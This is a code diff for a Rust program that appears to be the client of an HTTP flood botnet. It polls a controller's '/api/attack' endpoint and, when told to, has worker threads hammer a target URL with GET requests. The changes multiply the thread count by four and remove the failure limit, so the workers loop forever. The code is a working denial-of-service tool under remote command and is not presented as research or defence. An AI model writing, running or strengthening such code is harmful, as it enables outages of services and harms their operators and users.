@@ -10,16 +10,18 @@ struct Client {
 }
 
 struct Worker {
+    thread_no: usize,
     attacking: bool,
     address: String,
 }
 
 impl Worker {
-    fn new(addr: String) -> Worker {
-        Worker { attacking: false, address: addr }
+    fn new(addr: String, no:usize) -> Worker {
+        Worker { attacking: false, address: addr, thread_no: no}
     }
     fn start_requesting(&self) -> i32{
         if self.attacking {
+            println!("Thread {} is attacking", self.thread_no);
             let to_attack = self.address.as_str();
             let _ = reqwest::blocking::get(to_attack);
             return 0;
@@ -32,11 +34,11 @@ impl Client {
     fn new(host: String, addr: String) -> Client {
         let mut cl = Client { host_address: host, address: addr, attacking: false, workers: vec![], worker_threads: vec![] };
         cl.host_address.push_str("/api/attack");
-        let thread_count = std::thread::available_parallelism().unwrap().get();
+        let thread_count = (std::thread::available_parallelism().unwrap().get())*4;
         cl.worker_threads.reserve(thread_count);
-        for _ in 0..thread_count {
+        for i in 0..thread_count {
             cl.workers.push(Arc::new(Mutex::new(
-                Worker::new(cl.address.clone()))));
+                Worker::new(cl.address.clone(), i.clone()))));
         }
         return cl;
     }
@@ -44,7 +46,6 @@ impl Client {
     fn can_attack(&mut self) {
         let url = self.host_address.as_str();
         let req = reqwest::blocking::get(url).unwrap().text().unwrap();
-        // println!("Response: {}", req);
         if req == String::from("true") {
             self.attacking = true;
             for elem in self.workers.iter_mut() {
@@ -52,7 +53,6 @@ impl Client {
                 worker.attacking = true;
             }
         } else {
-            println!("Can't attack");
             self.attacking = false;
             for elem in self.workers.iter_mut() {
                 let mut worker = elem.lock().unwrap();
@@ -62,22 +62,12 @@ impl Client {
     }
 
     fn thread_worker(worker: Arc<Mutex<Worker>>){
-        let mut fail_count = 0;
         loop {
             let w = worker.lock().unwrap();
-            println!("{}, {}", fail_count, w.attacking);
-            let mut r = 0;
+            println!("{}", w.attacking);
+            let mut _r = 0;
             for _ in 0..20 {
-                r = w.start_requesting();
-            }
-            if r == 0{
-                fail_count = 0;
-            }
-            else{
-                fail_count +=1;
-            }
-            if fail_count == 5{
-                break;
+                _r = w.start_requesting();
             }
         }
     }
@@ -90,7 +80,7 @@ impl Client {
             let worker = self.workers[ind].clone();
             self.worker_threads.push(std::thread::spawn(move || {
                 Client::thread_worker(worker);
-            })); //todo fix this
+            }));
             i += 1;
         }
         let mut fail_count: u32 = 0;
@@ -113,7 +103,6 @@ impl Client {
             }
         }
         while self.worker_threads.len()>0 {
-            println!("Waiting for threads to finish");
             let thread= self.worker_threads.pop().unwrap();
             thread.join().unwrap();
         }
